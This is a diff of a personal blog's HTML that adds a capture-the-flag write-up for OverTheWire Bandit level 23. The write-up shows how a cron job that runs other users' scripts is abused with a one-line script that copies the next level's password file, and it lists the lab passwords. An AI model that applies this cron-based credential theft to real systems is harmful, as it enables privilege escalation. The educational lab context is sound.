@@ -5,7 +5,7 @@
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
 	
-	<title>My messy collection </title>
+	<title>My messy collection  | Bandit-Level 23</title>
 	<meta name="viewport" content="width=device-width,minimum-scale=1">
 	<meta name="generator" content="Hugo 0.132.2">
 	
@@ -27,9 +27,6 @@
 
 	
 
-	
-	<link rel="alternate" href="/post/index.xml" type="application/rss+xml" title="My messy collection">
-	<link rel="feed" href="/post/index.xml" type="application/rss+xml" title="My messy collection">
 	
 	
 	
@@ -148,11 +145,124 @@ onload='renderMathInElement(document.body);'></script>
 		<header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl">
 			<div
 				class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2">
-					<div class="pb-4">
-		<h1 >
-			<a href="//localhost:1313/" title="My messy collection" class="heading font-cursive icon">My messy collection</a>
-		</h1>
-	</div>
+				
+<div>
+	<h2>
+		<a href="/" title="My messy collection" class="heading font-cursive icon">My messy collection</a>
+	</h2>
+</div>
+<h1 class="pt-2">Bandit-Level 23</h1>
+
+<h3 class="text-java-700 font-normal leading-relaxed pt-2">Writeup</h3>
+
+<div class="flex flex-wrap justify-end pt-2 "><div class="md:flex-grow-0 font-light">
+	
+	
+	
+	
+	<a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400"
+		href='/categories/overthewire'>Overthewire</a>&nbsp;&#47;
+	
+	<a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400"
+		href='/categories/bandit'>Bandit</a>
+	
+	
+	
+
+	
+	&nbsp;&nbsp;
+	
+
+	
+	
+	
+	
+	<a class="post-taxonomy-tag text-eucalyptus-500"
+		href='/tags/ctf'>CTF</a>&nbsp;&#47;
+	
+	<a class="post-taxonomy-tag text-eucalyptus-500"
+		href='/tags/completed'>Completed</a>
+	
+	
+	
+</div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4"
+		datetime="2024-08-18T19:37:30&#43;03:00">2024-8-18</time>
+</div>
+
+<hr />
+
+
+			</div>
+		</header>
+		<main role="main" class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4">
+			
+
+<article>
+	<section class="mx-auto content">
+		<div class="c-rich-text"><h1 id="level-goal">Level goal</h1>
+<p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in <strong>/etc/cron.d/</strong> for the configuration and see what command is being executed.<br>
+NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!<br>
+NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…</p>
+<h3 id="login">Login</h3>
+<p><em>ssh <a href="mailto:bandit23@bandit.labs.overthewire.org">bandit23@bandit.labs.overthewire.org</a> -p 2220</em><br>
+<em>0Zf11ioIjMVN551jX3CmStKLYqjk54Ga</em></p>
+<h3 id="doc">Doc</h3>
+<p><a href="https://www.geeksforgeeks.org/bash-scripting-introduction-to-bash-and-bash-scripting/">Usefull read if you are new to bash scripting</a><br>
+<a href="https://www.redhat.com/sysadmin/linux-file-permissions-explained">File permissions</a></p>
+<h3 id="solution">Solution</h3>
+<p>With the same approach as until now, let`s see what the script being run does.</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>bandit23@bandit:~$ cd /etc/cron.d
+</span></span><span style="display:flex;"><span>bandit23@bandit:/etc/cron.d$ ls
+</span></span><span style="display:flex;"><span>cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  otw-tmp-dir	sysstat
+</span></span><span style="display:flex;"><span>bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+</span></span><span style="display:flex;"><span>@reboot bandit24 /usr/bin/cronjob_bandit24.sh <span style="color:#960050;background-color:#1e0010">&amp;</span>&gt; /dev/null
+</span></span><span style="display:flex;"><span>* * * * * bandit24 /usr/bin/cronjob_bandit24.sh <span style="color:#960050;background-color:#1e0010">&amp;</span>&gt; /dev/null
+</span></span><span style="display:flex;"><span>bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+</span></span><span style="display:flex;"><span>#!/bin/bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>myname=$(whoami)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cd /var/spool/$myname/foo
+</span></span><span style="display:flex;"><span>echo &#34;Executing and deleting all scripts in /var/spool/$myname/foo:&#34;
+</span></span><span style="display:flex;"><span>for i in * .*;
+</span></span><span style="display:flex;"><span>do
+</span></span><span style="display:flex;"><span>    if [ &#34;$i&#34; != &#34;.&#34; -a &#34;$i&#34; != &#34;..&#34; ];
+</span></span><span style="display:flex;"><span>    then
+</span></span><span style="display:flex;"><span>        echo &#34;Handling $i&#34;
+</span></span><span style="display:flex;"><span>        owner=&#34;$(stat --format &#34;%U&#34; ./$i)&#34;
+</span></span><span style="display:flex;"><span>        if [ &#34;${owner}&#34; = &#34;bandit23&#34; ]; then
+</span></span><span style="display:flex;"><span>            timeout -s 9 60 ./$i
+</span></span><span style="display:flex;"><span>        fi
+</span></span><span style="display:flex;"><span>        rm -f ./$i
+</span></span><span style="display:flex;"><span>    fi
+</span></span><span style="display:flex;"><span>done</span></span></code></pre></div>
+<p>You can break the script down line by line and get to the conclusion that basically, it runs all the valid scripts in foo, afterwards deletes all the contents of the directory. The interval for this process is 1 minute so we could just make our own script that <strong>cat`s</strong> the password for bandit24 and redirects it somewhere we want. We don`t care what happens to the script afterwards. (Chmod +x) makes a bash script executable. (Chmod +r) makes a bash script able to read.</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>bandit23@bandit:/etc/cron.d$ mktemp -d
+</span></span><span style="display:flex;"><span>/tmp/tmp.VKKpqs7HyM
+</span></span><span style="display:flex;"><span>bandit23@bandit:/etc/cron.d$ cd /tmp/tmp.VKKpqs7HyM
+</span></span><span style="display:flex;"><span>bandit23@bandit:/tmp/tmp.VKKpqs7HyM$ touch script.sh
+</span></span><span style="display:flex;"><span>bandit23@bandit:/tmp/tmp.VKKpqs7HyM$ chmod +x script.sh
+</span></span><span style="display:flex;"><span>bandit23@bandit:/tmp/tmp.VKKpqs7HyM$ nano script.sh</span></span></code></pre></div>
+<h4 id="script">Script:</h4>
+<pre tabindex="0"><code>#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 &gt; /tmp/tmp.VKKpqs7HyM/key.txt
+</code></pre><p>Now <strong>cat</strong> the file that came into your directory.</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>bandit23@bandit:/tmp/tmp.VKKpqs7HyM$ cat key.txt
+</span></span><span style="display:flex;"><span>gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8</span></span></code></pre></div>
+</div>
+	</section>
+
+
+</article>
+
+		</main>
+		<div class="w-full h-0 flex-none order-3"></div>
+		<aside role="contentinfo"
+			class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl">
+			<div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2">
+				
+	<div class="md:max-w-xs  flex flex-col md:items-end">
 	<ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col">
 	
 	
@@ -184,7 +294,6 @@ onload='renderMathInElement(document.body);'></script>
 	
 	
 	
-	
 	<div id="fastSearch" class="m-0">
 		<input id="searchInput" type="text" size=10 
 			class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
@@ -195,390 +304,6 @@ onload='renderMathInElement(document.body);'></script>
 	</div>
 	
 </ul>
-			</div>
-		</header>
-		<main role="main" class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4">
-			
-<article>
-	<section></section>
-	<section>
-		
-		<hr class="p-0 pt-4 m-0" />
-		<section class="flex flex-col md:flex-row items-start items-baseline">
-			<div class="md:pl-4 pb-2 md:sticky top-0 order-1 pr-6">
-				<h2 class=" text-eucalyptus-600">2024</h2>
-			</div>
-			<ul class="order-2 flex-grow">
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-18</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit23/">
-							Bandit-Level 23
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-18</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit22/">
-							Bandit-Level 22
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-18</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit21/">
-							Bandit-Level 21
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-18</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit20/">
-							Bandit-Level 20
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-18</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit19/">
-							Bandit-Level 19
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-18</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit18/">
-							Bandit-Level 18
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-18</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit17/">
-							Bandit-Level 17
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-18</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit16/">
-							Bandit-Level 16
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-18</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit15/">
-							Bandit-Level 15
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-18</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit14/">
-							Bandit-Level 14
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-18</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit13/">
-							Bandit-Level 13
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-18</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit12/">
-							Bandit-Level 12
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-17</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit11/">
-							Bandit-Level 11
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-17</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit10/">
-							Bandit-Level 10
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-17</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit9/">
-							Bandit-Level 9
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-17</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit8/">
-							Bandit-Level 8
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-17</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit7/">
-							Bandit-Level 7
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-16</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit6/">
-							Bandit-Level 6
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-15</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit5/">
-							Bandit-Level 5
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-14</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit4/">
-							Bandit-Level 4
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-13</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit3/">
-							Bandit-Level 3
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-13</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/amodel-bandit2/">
-							Bandit-Level 2
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-12</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit1/">
-							Bandit-Level 1
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-				<div class="py-2 flex">
-					<span class="font-serif pr-4 flex-shrink-0">08-11</span>
-					<div class="font-serif font-medium">
-						<a href="//localhost:1313/post/bandit0/">
-							Bandit-Level 0
-						</a>
-						
-						<div class="pl-4  text-gray-600 font-light">Writeup</div>
-						
-					</div>
-				</div>
-				
-			</ul>
-		</section>
-		
-		
-	</section>
-</article>
-
-		</main>
-		<div class="w-full h-0 flex-none order-3"></div>
-		<aside role="contentinfo"
-			class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl">
-			<div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2">
-				
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="md:max-w-xs  flex flex-col md:items-end pt-2">
 	
 
 <div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start   max-h-16">
@@ -632,21 +357,75 @@ onload='renderMathInElement(document.body);'></script>
 	
 </div>
 
-	<div class="a-gray text-sm text-gray-500 leading-tight">
+	<div class="text-sm text-gray-500 leading-tight a-gray">
 		
-			33 pages, 4656 words in total.
+		<br />
+		320 words in this page.
 	</div>
 </div>
+
 			</div>
 		</aside>
 		<footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2">
 			
+<hr class="double-line" />
+<div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
+    
+    <a class="flex-grow-0" href="/post/bandit22/">
+        <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
+            height="24">
+            <path fill="none" d="M0 0h24v24H0z" />
+            <path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z" /></svg>
+        Bandit-Level 22
+    </a>
+    
+    
+</div>
+<div >
 
 
 
+<div class="font-serif pb-2 flex align-start leading-loose">
+	<span class="heading pr-6 leading-loose">Related</span>
+	<span >
+		
+			<a href="/post/bandit22/">Bandit-Level 22</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/bandit21/">Bandit-Level 21</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/bandit20/">Bandit-Level 20</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/bandit19/">Bandit-Level 19</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/bandit18/">Bandit-Level 18</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/bandit17/">Bandit-Level 17</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/bandit16/">Bandit-Level 16</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/bandit15/">Bandit-Level 15</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/bandit14/">Bandit-Level 14</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/bandit13/">Bandit-Level 13</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/bandit12/">Bandit-Level 12</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/bandit11/">Bandit-Level 11</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/bandit10/">Bandit-Level 10</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/bandit9/">Bandit-Level 9</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/bandit8/">Bandit-Level 8</a>
+		
+</span>
+</div>
 
-
-
+</div>
+<div class="pb-2">
+    
+</div>
 
 		</footer>
 		
